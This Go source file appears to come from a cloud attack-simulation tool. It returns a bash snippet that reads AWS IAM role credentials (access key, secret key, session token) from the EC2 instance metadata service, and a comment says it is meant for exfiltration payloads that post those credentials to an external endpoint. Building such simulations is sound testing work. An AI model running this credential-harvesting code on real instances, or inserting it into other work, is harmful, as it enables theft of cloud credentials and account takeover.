// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

// IMDSHelperSnippet returns a bash snippet that sets up IMDS access compatible
// with both IMDSv2 and IMDSv1. Defines an `imds_get` function and sets
// ROLE_NAME, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN,
// and REGION for use by exfil payloads that need explicit credential values.
//
// SSM commands run on already-running instances where the AWS CLI works directly
// via the instance role — this snippet is only needed for payloads that explicitly
// read the raw IMDS credential values (e.g., to POST them to an external endpoint).
func IMDSHelperSnippet() string {
	return `# --- IMDS Setup (IMDSv2 with IMDSv1 fallback) ---
IMDS_TOKEN=""
IMDS_TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 300" 2>/dev/null || true)

imds_get() {
    local path="$1"
    if [ -n "$IMDS_TOKEN" ]; then
        curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" "http://169.254.169.254${path}"
    else
        curl -s "http://169.254.169.254${path}"
    fi
}

ROLE_NAME=$(imds_get /latest/meta-data/iam/security-credentials/)
CREDENTIALS=$(imds_get /latest/meta-data/iam/security-credentials/$ROLE_NAME)
AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS" | grep -o '"AccessKeyId" *: *"[^"]*"' | cut -d'"' -f4)
AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS" | grep -o '"SecretAccessKey" *: *"[^"]*"' | cut -d'"' -f4)
AWS_SESSION_TOKEN=$(echo "$CREDENTIALS" | grep -o '"Token" *: *"[^"]*"' | cut -d'"' -f4)
REGION=$(imds_get /latest/meta-data/placement/region)
# --- End IMDS Setup ---`
}
